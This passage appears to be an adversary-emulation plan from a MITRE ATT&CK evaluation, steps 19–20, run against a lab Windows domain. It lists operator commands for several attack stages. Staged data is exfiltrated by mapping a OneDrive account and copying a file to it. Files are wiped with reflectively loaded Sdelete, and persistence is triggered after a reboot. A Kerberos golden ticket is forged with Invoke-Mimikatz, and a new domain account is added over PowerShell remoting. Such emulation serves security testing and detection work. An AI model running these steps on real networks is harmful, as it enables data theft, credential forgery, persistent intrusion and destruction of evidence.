**Technique:** Web Service, / Exfiltration Over Alternative Protocol  
**Who/where:** dschrute · UTICA → ONEDRIVE  

The attacker maps a local drive to an online web service account (T1102) then exfiltrates the previous staged data to this repository (T1048).

```
If you are generating PCPAS and are filtering the traffic, STOP the PCAP on UTICA and start another one without any filters to be able to capture the ONE DRIVE connection.

1.  Get CID for OneDrive account (https://www.laptopmag.com/articles/map-onedrive-network-drive)
2.  net use y: https://d.docs.live.net/YOURCID /YOURACCOUNT@outlook.com "YOURPASSWORD"
3.  Copy-Item "C:\Windows\Temp\WindowsParentalControlMigration.tmp" -Destination "Y:\WindowsParentalControlMigration.tmp"
4.  Login to https://onedrive.live.com/?id=root&cid=[CID] to see exfil (`WindowsParentalControlMigration.tmp`)
```

### 19.A — Clean up
**Technique:** File Deletion, / Process Injection  
**Who/where:** dschrute · UTICA  

The attacker deletes various files (T1107) associated with that access by reflectively loading and executing the Sdelete binary (T1055) within powershell.exe

```
1.  loadmodule wipe.ps1
2.  wipe "C:\Windows\System32\m.exe"
    
**Note:** There's a known bug here with ETW (Invoke-ReflectivePEInjection patches a function on the fly that ETW invokes) so callback may die and hang
```

### 19.B — Clean up
**Technique:** File Deletion, / Process Injection  
**Who/where:** dschrute · UTICA  

The attacker deletes various files (T1107) associated with that access by reflectively loading and executing the Sdelete binary (T1055) within powershell.exe

```
1.  wipe "C:\Windows\Temp\WindowsParentalControlMigration.tmp"
```

### 19.C — Clean up
**Technique:** File Deletion, / Process Injection  
**Who/where:** dschrute · UTICA  

The attacker deletes various files (T1107) associated with that access by reflectively loading and executing the Sdelete binary (T1055) within powershell.exe

```
1.  wipe "C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML"

DO NOT REBOOT COMPUTER YET. STOP PCAP TRACE FROM AZURE PCAP.
```

### 20.A — Leverage Persistence
**Technique:** Rundll32, / Windows Management Instrumentation Event Subscription, / PowerShell  
**Who/where:** dschrute · UTICA  

The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the DLL payload (T1085), referenced by the Windows Registry Run key, and the WMI event subscription (T1084), which executes a new PowerShell stager (T1086).

```
1.  restart-computer -force
2.  Existing 2 callbacks should die
3.  RDP and login to initial victim once it reboots
4.  Persistence mechanisms should fire on login (1 for DLL, 1 or more for WMI event subscription)

**Note:** You may need to repeat login process a few times (close and reopen RDP session) for WMI execute to fire
```

### 20.B — Leverage Persistence
**Technique:** Pass the Ticket, / Windows Remote Management, / Create Account  
**Who/where:** dschrute · UTICA → SCRANTON  

The attacker uses the renewed access to generate a Kerberos Golden Ticket (T1097), using materials from the earlier breach, which is used to establish a remote PowerShell session to a new victim (T1028). Through this connection, the attacker creates a new account within the domain (T1136).

```
1.  Interact with the SYSTEM PS callback (from WMI)
2.  klist purge
3.  loadmodule Invoke-Mimikatz-Evals.ps1 (available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
4.  invoke-mimikatz-Evals -command '"kerberos::golden /domain:dmevals.local /sid:[SID] /rc4:[NTLM HASH] /user:kmalone /ptt"' using the SID and NTLM values from earlier
5.  klist (confirm ticket is in cache)
6.  Enter-PSSession SCRANTON
7.  Invoke-Command -ComputerName SCRANTON -ScriptBlock {net user /add toby "pamBeesly<3"}
```
